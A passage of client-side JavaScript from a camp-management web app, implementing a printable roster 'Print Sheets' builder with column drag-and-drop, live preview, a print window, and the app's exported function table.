function psColDrop(e,sheetId,targetColId){
    e.preventDefault();
    var s=psGet(sheetId),dragId=_psDragColId;
    _psClearDropCues();
    if(!s||!dragId||dragId===targetColId){_psDragColId=null;return}
    var cols=s.columns||[];
    var from=cols.findIndex(function(c){return c.id===dragId});
    if(from<0){_psDragColId=null;return}
    var row=e.target.closest('.ps-col-row');
    var after=false;
    if(row){var rect=row.getBoundingClientRect();after=(e.clientY-rect.top)>rect.height/2}
    var moved=cols.splice(from,1)[0];
    var insertIdx=cols.findIndex(function(c){return c.id===targetColId});
    if(insertIdx<0)insertIdx=cols.length;else if(after)insertIdx+=1;
    cols.splice(insertIdx,0,moved);
    _psDragColId=null;
    psSave();renderPrintSheets();
}
function psSetColField(id,colId,v){
    var s=psGet(id);if(!s)return;
    var col=(s.columns||[]).filter(function(c){return c.id===colId})[0];
    if(col){col.field=v;psSave();renderPrintSheets()}
}
function psSetColHeader(id,colId,v){
    var s=psGet(id);if(!s)return;
    var col=(s.columns||[]).filter(function(c){return c.id===colId})[0];
    if(col){col.header=v;psRefreshPreview(id);psSaveSoon()}
}
// Update only the live preview pane (keeps input focus while typing headers)
function psRefreshPreview(id){
    var s=psGet(id),el=document.getElementById('psPreview');
    if(s&&el)el.innerHTML=psPreviewHtml(s);
}

// ── preview + print output ──
function psPreviewHtml(sheet){
    var groups=psGroups(sheet),allRows=groups.reduce(function(a,g){return a.concat(g.rows)},[]);
    var cols=psActiveColumns(sheet,allRows);
    if(!cols.length)return'<div class="ps-hint">Add at least one column with a field selected to see a preview.</div>';
    var h='';
    groups.forEach(function(g){
        var gcols=psActiveColumns(sheet,g.rows);
        if(!gcols.length)gcols=cols;
        h+='<div class="ps-sheet">';
        if(sheet.groupBy)h+='<div class="ps-sheet-title">'+esc(g.label||'(Unassigned)')+' <span class="ps-count">'+g.rows.length+'</span></div>';
        h+=psTableHtml(gcols,g.rows);
        h+='</div>';
    });
    return h;
}
function psPrint(id){
    var sheet=psGet(id);if(!sheet)return;
    var groups=psGroups(sheet),allRows=groups.reduce(function(a,g){return a.concat(g.rows)},[]);
    var baseCols=psActiveColumns(sheet,allRows);
    if(!baseCols.length){toast('Add at least one column first','error');return}
    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
    var campName=(s.camp_name||s.campName||(s.campistryMe&&s.campistryMe.campSettings&&s.campistryMe.campSettings.campName)||'');
    var w=window.open('','_blank');
    if(!w){toast('Pop-up blocked — allow pop-ups to print','error');return}
    var css='@page{margin:14mm}*{box-sizing:border-box}body{font-family:Arial,Helvetica,sans-serif;color:#0f172a;margin:0;padding:18px}'
        +'.ps-sheet{page-break-inside:auto}.ps-sheet+.ps-sheet{page-break-before:always}'
        +'.ps-hd{display:flex;justify-content:space-between;align-items:baseline;border-bottom:2px solid #0f172a;padding-bottom:6px;margin-bottom:10px}'
        +'.ps-hd h1{font-size:16px;margin:0}.ps-hd .sub{font-size:11px;color:#64748b}'
        +'.ps-sheet-title{font-size:14px;font-weight:700;margin:0 0 8px}.ps-count{color:#64748b;font-weight:400;font-size:11px}'
        +'table{width:100%;border-collapse:collapse;margin-bottom:6px;font-size:12px}'
        +'th{text-align:left;background:#f1f5f9;border:1px solid #cbd5e1;padding:6px 8px;font-size:11px;text-transform:uppercase;letter-spacing:.3px}'
        +'td{border:1px solid #cbd5e1;padding:6px 8px;vertical-align:top}tr{page-break-inside:avoid}'
        +'.ps-write{height:26px}.ps-empty{text-align:center;color:#94a3b8}'
        +'.ps-foot{margin-top:14px;font-size:10px;color:#94a3b8}';
    var h='<!DOCTYPE html><html><head><meta charset="utf-8"><title>'+esc(sheet.name||'Print Sheet')+'</title><style>'+css+'</style></head><body>';
    groups.forEach(function(g){
        var gcols=psActiveColumns(sheet,g.rows);
        if(!gcols.length)gcols=baseCols;
        h+='<div class="ps-sheet">';
        h+='<div class="ps-hd"><h1>'+esc(sheet.name||'Print Sheet')+(sheet.groupBy?' — '+esc(g.label||'(Unassigned)'):'')+'</h1>'
            +'<div class="sub">'+esc(campName)+(campName?' · ':'')+esc(new Date().toLocaleDateString())+' · '+g.rows.length+' campers</div></div>';
        h+=psTableHtml(gcols,g.rows);
        h+='</div>';
    });
    h+='</body></html>';
    w.document.write(h);w.document.close();
    setTimeout(function(){try{w.focus();w.print()}catch(e){}},350);
}

// ── page render ──
function renderPrintSheets(){
    var c=document.getElementById('page-printsheets');
    if(!c)return;
    if(psEditingId&&psGet(psEditingId)){c.innerHTML=psEditorHtml(psGet(psEditingId));return}
    psEditingId=null;
    var h=_reportsTabsHtml('printsheets');
    h+='<div class="sec-hd"><div><h2 class="sec-title">Print Sheets</h2><p class="sec-desc">Design custom printable sheets — pick what goes in each column, then print one per bunk, grade, or division.</p></div><div class="sec-actions"><button class="me-btn me-btn--pri" onclick="CampistryMe.psNew()">+ New Sheet</button></div></div>';
    if(!printSheets.length){
        h+='<div class="me-empty"><h3>No print sheets yet</h3><p>Build a sheet of columns — camper name, bunk, parent address, allergies, a blank sign-in column — and print it grouped however you need.</p><button class="me-btn me-btn--pri" style="margin-top:10px" onclick="CampistryMe.psNew()">+ Create your first sheet</button></div>';
        c.innerHTML=h;return;
    }
    h+='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px">';
    printSheets.forEach(function(s){
        var cols=(s.columns||[]).filter(psColPrints);
        var grpLabel={'':'One combined sheet',division:'One sheet per division',grade:'One sheet per grade',bunk:'One sheet per bunk',team:'One sheet per team'}[s.groupBy||'']||'';
        var scope=s.scopeDiv?('Division: '+s.scopeDiv):'All campers';
        h+='<div class="me-card" style="padding:16px;display:flex;flex-direction:column;gap:8px">'
            +'<div style="font-size:.95rem;font-weight:700">'+esc(s.name||'Untitled Sheet')+'</div>'
            +'<div style="font-size:.72rem;color:var(--s400)">'+cols.length+' column'+(cols.length===1?'':'s')+' · '+esc(grpLabel)+'</div>'
            +'<div style="font-size:.72rem;color:var(--s400)">'+esc(scope)+'</div>'
            +'<div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px">'
            +'<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.psPrint(\''+je(s.id)+'\')">Print</button>'
            +'<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.psEdit(\''+je(s.id)+'\')">Edit</button>'
            +'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.psDuplicate(\''+je(s.id)+'\')">Duplicate</button>'
            +'<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe.psDelete(\''+je(s.id)+'\')">Delete</button>'
            +'</div></div>';
    });
    h+='</div>';
    c.innerHTML=h;
}
function psEditorHtml(s){
    var fieldOpts=psFields();
    function fieldSelect(col){
        var o='<option value="">— empty (won\'t print) —</option>';
        fieldOpts.forEach(function(f){o+='<option value="'+esc(f.key)+'"'+(f.key===col.field?' selected':'')+'>'+esc(f.label)+'</option>'});
        return o;
    }
    var h='<div class="sec-hd"><div style="display:flex;align-items:center;gap:10px"><button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.psBack()">← Back</button><h2 class="sec-title" style="margin:0">Edit Sheet</h2></div><div class="sec-actions"><button class="me-btn me-btn--pri" onclick="CampistryMe.psPrint(\''+je(s.id)+'\')">Print</button></div></div>';
    h+='<div class="ps-builder">';
    // ── config column ──
    h+='<div class="ps-config">';
    h+='<div class="me-field"><label>Sheet Name</label><input type="text" class="me-input" value="'+esc(s.name||'')+'" oninput="CampistryMe.psRename(\''+je(s.id)+'\',this.value)" onchange="CampistryMe.psRename(\''+je(s.id)+'\',this.value)" placeholder="e.g. Bunk Sign-In Sheet"></div>';

    var divOpts='<option value="">All campers</option>'+Object.keys(structure).sort().map(function(d){return'<option value="'+esc(d)+'"'+(d===s.scopeDiv?' selected':'')+'>'+esc(d)+'</option>'}).join('');
    h+='<div class="me-field"><label>Include</label><select class="me-input" onchange="CampistryMe.psSetProp(\''+je(s.id)+'\',\'scopeDiv\',this.value)">'+divOpts+'</select></div>';

    var groupOpts=[['','One combined sheet (no split)'],['division','A separate sheet per division'],['grade','A separate sheet per grade'],['bunk','A separate sheet per bunk'],['team','A separate sheet per league team']];
    h+='<div class="me-field"><label>Print</label><select class="me-input" onchange="CampistryMe.psSetProp(\''+je(s.id)+'\',\'groupBy\',this.value)">'+groupOpts.map(function(g){return'<option value="'+g[0]+'"'+(g[0]===(s.groupBy||'')?' selected':'')+'>'+g[1]+'</option>'}).join('')+'</select></div>';

    var sortOpts=[['lastName','Last name'],['firstName','First name'],['bunk','Bunk'],['grade','Grade'],['camperId','Camper ID']];
    h+='<div class="me-field"><label>Sort rows by</label><select class="me-input" onchange="CampistryMe.psSetProp(\''+je(s.id)+'\',\'sortBy\',this.value)">'+sortOpts.map(function(o){return'<option value="'+o[0]+'"'+(o[0]===(s.sortBy||'lastName')?' selected':'')+'>'+o[1]+'</option>'}).join('')+'</select></div>';

    h+='<label style="display:flex;align-items:center;gap:8px;font-size:.78rem;color:var(--s600);margin-top:4px;cursor:pointer"><input type="checkbox"'+(s.hideEmptyCols!==false?' checked':'')+' onchange="CampistryMe.psToggleHideEmpty(\''+je(s.id)+'\',this.checked)"> Hide columns that are empty for everyone</label>';

    // ── columns editor ──
    h+='<div class="ps-cols-hd">Columns</div>';
    h+='<p style="font-size:.68rem;color:var(--s400);margin:0 0 8px">Pick a field for each column. Leave a column empty and it simply won\'t print. Choose <em>Blank / write-in</em> for a handwriting column (give it a header).</p>';
    h+='<div class="ps-cols">';
    (s.columns||[]).forEach(function(col,i){
        h+='<div class="ps-col-row" data-colid="'+je(col.id)+'" draggable="false"'
            +' ondragstart="CampistryMe.psColDragStart(event,\''+je(col.id)+'\')"'
            +' ondragend="CampistryMe.psColDragEnd(event)"'
            +' ondragover="CampistryMe.psColDragOver(event)"'
            +' ondragleave="CampistryMe.psColDragLeave(event)"'
            +' ondrop="CampistryMe.psColDrop(event,\''+je(s.id)+'\',\''+je(col.id)+'\')">'
            +'<span class="ps-col-drag" title="Drag to reorder" onmousedown="CampistryMe.psColDragHandle(event)">⋮⋮</span>'
            +'<div class="ps-col-fields">'
            +'<select class="me-input me-input--sm" onchange="CampistryMe.psSetColField(\''+je(s.id)+'\',\''+je(col.id)+'\',this.value)">'+fieldSelect(col)+'</select>'
            +'<input type="text" class="me-input me-input--sm" value="'+esc(col.header||'')+'" placeholder="'+esc(col.field?('Header: '+psFieldLabel(col.field)):'Column header')+'" oninput="CampistryMe.psSetColHeader(\''+je(s.id)+'\',\''+je(col.id)+'\',this.value)">'
            +'</div>'
            +'<button class="me-btn me-btn--ghost me-btn--sm" title="Remove column" style="color:var(--err)" onclick="CampistryMe.psRemoveColumn(\''+je(s.id)+'\',\''+je(col.id)+'\')">✕</button>'
            +'</div>';
    });
    h+='</div>';
    h+='<button class="me-btn me-btn--sec me-btn--sm" style="margin-top:8px" onclick="CampistryMe.psAddColumn(\''+je(s.id)+'\')">+ Add Column</button>';
    // A bus column with no route data behind it prints blank and looks like a
    // bug. Say so here rather than letting them find out at the printer.
    var _usesBus=(s.columns||[]).some(function(col){return col.field&&col.field.indexOf('bus')===0});
    if(_usesBus&&!_busHasData()){
        h+='<div style="margin-top:10px;padding:9px 11px;background:var(--warn-bg,#fff8e1);border:1px solid var(--warn-border,#ffe082);border-radius:var(--r);font-size:.72rem;color:var(--s600);line-height:1.55">'
            +'<strong>No bus routes found yet.</strong> Bus columns fill in from <a href="campistry_go.html" style="color:var(--me);font-weight:600">Campistry Go</a> once routes have been generated and saved there. They\'ll print blank until then.</div>';
    }
    h+='</div>'; // ps-config

    // ── live preview ──
    h+='<div class="ps-preview-wrap"><div class="ps-preview-hd">Live Preview</div><div id="psPreview" class="ps-preview">'+psPreviewHtml(s)+'</div></div>';
    h+='</div>'; // ps-builder
    return h;
}

window.CampistryMe={
    nav:nav,closeModal:closeModal,
    viewCamper:viewCamper,editCamper:editCamper,addCamper:addCamper,deleteCamper:deleteCamper,ceToggleSummer:ceToggleSummer,
    addFamily:function(){openFamilyForm(null)},editFamily:function(id){openFamilyForm(id)},deleteFamily:deleteFamily,removeCamperFromFamily:removeCamperFromFamily,
    viewFamilyFromCamper:viewFamilyFromCamper,
    setPplStaffSubTab:setPplStaffSubTab,viewStaffMember:viewStaffMember,openEditStaffModal:openEditStaffModal,saveStaffMember:saveStaffMember,
    acceptFamilySuggestion:acceptFamilySuggestion,dismissFamilySuggestion:dismissFamilySuggestion,acceptAddToFamily:acceptAddToFamily,
    mergeFamilies:mergeFamilies,dismissMergeFamilies:dismissMergeFamilies,
    addDiv:function(){openDivForm(null)},editDiv:function(n){openDivForm(n)},deleteDiv:deleteDiv,moveDivision:moveDivision,
    openCsv:function(){openModal('csvModal')},downloadTemplate:downloadTemplate,
    _updateBillingBulkBar:_updateBillingBulkBar,bulkExportBilling:bulkExportBilling,
    setRosterPage:setRosterPage,setBillingPage:setBillingPage,setAnalyticsInvoicePage:setAnalyticsInvoicePage,setAnalyticsPaymentPage:setAnalyticsPaymentPage,
    _runSetupChecklistAction:_runSetupChecklistAction,dismissSetupChecklist:dismissSetupChecklist,
    bbDrop:bbDrop,autoAssign:autoAssign,autoGenerateBunks:autoGenerateBunks,openBunkGenSettings:openBunkGenSettings,showCamperBunkRequests:showCamperBunkRequests,clearBunks:clearBunks,setBunkCount:setBunkCount,openBunkCountModal:openBunkCountModal,_clearBunkCount:_clearBunkCount,
    openBunkStaffModal:openBunkStaffModal,addBunkStaff:addBunkStaff,removeBunkStaff:removeBunkStaff,
    editBunkStaff:editBunkStaff,_resetBunkStaffForm:_resetBunkStaffForm,inviteBunkStaffToLite:inviteBunkStaffToLite,
    openDivisionHeadModal:openDivisionHeadModal,addDivisionHead:addDivisionHead,removeDivisionHead:removeDivisionHead,
    editDivisionHead:editDivisionHead,_resetDivisionHeadForm:_resetDivisionHeadForm,inviteDivisionHeadToLite:inviteDivisionHeadToLite,
    fillDivisionHeadFromHired:fillDivisionHeadFromHired,
    // Staff directory — the single source of truth for who works with which
    // bunk. Flow (league captains), Lite (a counselor's own bunk) and the
    // office (pickup notifications) all resolve people through these, so the
    // answer can't drift between apps.
    // Hiring → bunk placement, so a hired applicant becomes a reachable
    // counselor without anyone retyping their email.
    // What counselors may see in Lite — set here, enforced there.
    visibilityPolicy:visibilityPolicy,toggleVisibilityPanel:toggleVisibilityPanel,
    setCounselorVisibility:setCounselorVisibility,resetCounselorVisibility:resetCounselorVisibility,
    hiredStaff:hiredStaff,allBunkNames:allBunkNames,bunksForStaffEmail:bunksForStaffEmail,
    assignHiredToBunk:assignHiredToBunk,unassignHiredFromBunk:unassignHiredFromBunk,
    fillBunkStaffFromHired:fillBunkStaffFromHired,
    getStaffForBunk:getStaffForBunk,getStaffForBunks:getStaffForBunks,
    getStaffForDivision:getStaffForDivision,getBunksForDivision:getBunksForDivision,
    findStaffByEmail:findStaffByEmail,getAllStaff:getAllStaff,
    copyRegLink:copyRegLink,addDocRow:addDocRow,addApplication:addApplication,_onAppPhotoPick:_onAppPhotoPick,autoPromoteWaitlist:autoPromoteWaitlist,
    viewApplication:viewApplication,updateEnrollStatus:updateEnrollStatus,bulkEnrollStatus:bulkEnrollStatus,toggleAllEnroll:toggleAllEnroll,_updateRegBulkBar:_updateRegBulkBar,enrollCamper:enrollCamper,generateParentInvite:generateParentInvite,rescindEnrollment:rescindEnrollment,
    saveAppNote:saveAppNote,printApplication:printApplication,
    openFormConfig:openFormConfig,saveFormConfig:saveFormConfig,addCustomQ:addCustomQ,addPromoRow:addPromoRow,
    openStaffFormConfig:openStaffFormConfig,saveStaffFormConfig:saveStaffFormConfig,addStaffCustomQ:addStaffCustomQ,
    openPostAcceptFormConfig:openPostAcceptFormConfig,savePostAcceptFormConfig:savePostAcceptFormConfig,addPafCustomQ:addPafCustomQ,
    openPostHireFormConfig:openPostHireFormConfig,savePostHireFormConfig:savePostHireFormConfig,addPhfCustomQ:addPhfCustomQ,
    _phfHandbookPick:_phfHandbookPick,_phfHandbookClear:_phfHandbookClear,addPhfPolicyRow:addPhfPolicyRow,
    addCustomSection:addCustomSection,addSectionField:addSectionField,addCustomQToSection:addCustomQToSection,_toggleSectionQuestions:_toggleSectionQuestions,
    openSendPostAcceptModal:openSendPostAcceptModal,
    openSendPostHireModal:openSendPostHireModal,
    addPositionRow:addPositionRow,addCertRow:addCertRow,
    _fcSwitchTab:_fcSwitchTab,_brandingLogoPick:_brandingLogoPick,_brandingLogoClear:_brandingLogoClear,_toggleAcc:_toggleAcc,
    openFormBuilder:openFormBuilder,closeFormBuilder:closeFormBuilder,_fbOpenPreviewWindow:_fbOpenPreviewWindow,
    _toggleMenu:_toggleMenu,
    copyLinkText:copyLinkText,showLinkQR:showLinkQR,showRegistrationQR:showRegistrationQR,showStaffQR:showStaffQR,
    openSendLinkModal:openSendLinkModal,openSendRegLinkModal:openSendRegLinkModal,openSendStaffLinkModal:openSendStaffLinkModal,
    // Payroll
    prSetTab:prSetTab,prEditStaff:prEditStaff,prRemoveStaff:prRemoveStaff,
    prToggleSummer:prToggleSummer,prToggleYc:prToggleYc,prPayTypeHint:prPayTypeHint,
    prWeekStep:prWeekStep,prWeekToday:prWeekToday,
    prSetHours:prSetHours,prSetSigned:prSetSigned,prSetSheetStatus:prSetSheetStatus,
    prEditProgram:prEditProgram,prNewRun:prNewRun,prDeleteRun:prDeleteRun,prExportCSV:prExportCSV,
    ptConnectStripe:ptConnectStripe,ptCopyLink:ptCopyLink,ptPayout:ptPayout,
    ptOpenAdd:ptOpenAdd,ptOpenEdit:ptOpenEdit,ptSaveAccount:ptSaveAccount,ptRemove:ptRemove,
    ptDownloadTemplate:ptDownloadTemplate,ptUploadTemplate:ptUploadTemplate,
    finSetTab:finSetTab,finAddStaff:finAddStaff,finEditStaff:finEditStaff,finStaffModal:finStaffModal,_staffPhotoPick:_staffPhotoPick,_staffPhotoClear:_staffPhotoClear,finRemoveStaff:finRemoveStaff,
    finAddExpense:finAddExpense,finRemoveExpense:finRemoveExpense,
    finAddPayment:finAddPayment,finRemovePayment:finRemovePayment,finRefund:finRefund,
    sendPayLink:sendPayLink,copyPayLink:copyPayLink,toggleBillingAccess:toggleBillingAccess,
    monthlyPlan:monthlyPlan,toggleFamilyAutopay:toggleFamilyAutopay,cancelMonthlyPlan:cancelMonthlyPlan,
    viewStaffApp:viewStaffApp,setStaffStatus:setStaffStatus,saveStaffNotes:saveStaffNotes,openAssignPositionModal:openAssignPositionModal,
    openStaffContractModal:openStaffContractModal,saveStaffContract:saveStaffContract,scPayTypeHint:scPayTypeHint,copyStaffContractLink:copyStaffContractLink,
    toggleOnboard:toggleOnboard,cycleRef:cycleRef,deleteStaffApp:deleteStaffApp,addStaffApp:addStaffApp,
    copyStaffLink:copyStaffLink,exportStaffCSV:exportStaffCSV,
    setLeadFilter:setLeadFilter,viewLead:viewLead,setLeadStatus:setLeadStatus,saveLeadNotes:saveLeadNotes,
    setLeadFollowUp:setLeadFollowUp,addLeadActivity:addLeadActivity,deleteLead:deleteLead,addLead:addLead,
    copyInquiryLink:copyInquiryLink,exportLeadsCSV:exportLeadsCSV,
    finSetBudget:finSetBudget,finSetOverdue:finSetOverdue,
    finExportCSV:finExportCSV,finExportQB:finExportQB,finExportIIF:finExportIIF,
    finExportXero:finExportXero,finExportJournal:finExportJournal,finImportCSV:finImportCSV,
    _pickColor:_pickColor,_addGradeRow:_addGradeRow,
    // Billing — family ledger system
    openPaymentModal:openPaymentModal,openPaymentForFamily:openPaymentForFamily,removePayment:removePayment,
    addCharge:addCharge,addChargeForFamily:addChargeForFamily,
    issueCredit:issueCredit,issueCreditForFamily:issueCreditForFamily,
    setBillFilter:setBillFilter,printStatement:printStatement,
    requestCardSetup:requestCardSetup,chargeStoredCard:chargeStoredCard,batchCharge:batchCharge,
    // Broadcasts
    openBroadcastModal:openBroadcastModal,viewBroadcast:viewBroadcast,removeBroadcast:removeBroadcast,
    // Forms & Docs
    addForm:addForm,deleteForm:deleteForm,viewFormResponses:viewFormResponses,
    switchFormsTab:switchFormsTab,
    addLinkDigitalForm:addLinkDigitalForm,addLinkPrintForm:addLinkPrintForm,addLinkDocument:addLinkDocument,
    editLinkItem:editLinkItem,deleteLinkItem:deleteLinkItem,
    // Reports
    exportRosterReport:exportRosterReport,exportFamilyReport:exportFamilyReport,printFamilies:printFamilies,
    openReportBuilder:openReportBuilder,rbSourceChange:rbSourceChange,rbAddFilter:rbAddFilter,rbPreview:rbPreview,saveCurrentReport:saveCurrentReport,runSavedReport:runSavedReport,exportSavedReport:exportSavedReport,printSavedReport:printSavedReport,deleteSavedReport:deleteSavedReport,
    exportEnrollmentReport:exportEnrollmentReport,exportDivisionReport:exportDivisionReport,
    exportMedicalReport:exportMedicalReport,exportFinancialReport:exportFinancialReport,
    // Broadcast delivery
    sendBroadcastNow:sendBroadcastNow,sendPaymentReminders:sendPaymentReminders,sendFormReminders:sendFormReminders,
    // Camper notes & timeline
    addCamperNote:addCamperNote,
    // Re-enrollment
    reEnrollCamper:reEnrollCamper,
    // Custom fields
    manageCustomFields:manageCustomFields,_addCustomField:_addCustomField,_removeCustomField:_removeCustomField,
    // Documents
    uploadDocument:uploadDocument,_removeDoc:_removeDoc,
    // Scholarships
    addScholarship:addScholarship,
    // Print Sheets
    psNew:psNew,psEdit:psEdit,psBack:psBack,psDelete:psDelete,psDuplicate:psDuplicate,
    psPrint:psPrint,psRename:psRename,psSetProp:psSetProp,psToggleHideEmpty:psToggleHideEmpty,
    psAddColumn:psAddColumn,psRemoveColumn:psRemoveColumn,psMoveColumn:psMoveColumn,
    psColDragHandle:psColDragHandle,psColDragStart:psColDragStart,psColDragEnd:psColDragEnd,
    psColDragOver:psColDragOver,psColDragLeave:psColDragLeave,psColDrop:psColDrop,
    psSetColField:psSetColField,psSetColHeader:psSetColHeader,
};
})();
